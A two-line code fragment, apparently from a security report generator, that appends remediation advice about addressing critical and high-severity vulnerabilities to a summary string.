             summary += '- Immediately address all critical vulnerabilities\n';
             summary += '- Prioritize high-severity issues\n';
